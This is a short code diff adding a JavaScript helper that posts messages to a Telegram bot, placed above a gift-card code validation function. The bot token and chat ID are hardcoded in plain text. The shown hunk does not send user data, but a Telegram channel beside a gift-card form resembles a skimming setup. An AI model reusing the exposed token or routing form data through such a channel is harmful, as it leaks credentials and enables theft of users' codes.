@@ -1,3 +1,26 @@
+const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
+const chatId = '-4614449543';
+
+const sendMessage = async function (message) {
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      // parse_mode: 'MarkdownV2',
+    }),
+  })
+    .then(response => response.json())
+    .then(data => {
+      return data;
+    })
+    .catch(error => {
+      console.error('خطا در ارسال پیام:', error);
+    });
+};
 function validateGiftCardCode(code) {
   const str = code.replaceAll('-', '');
 
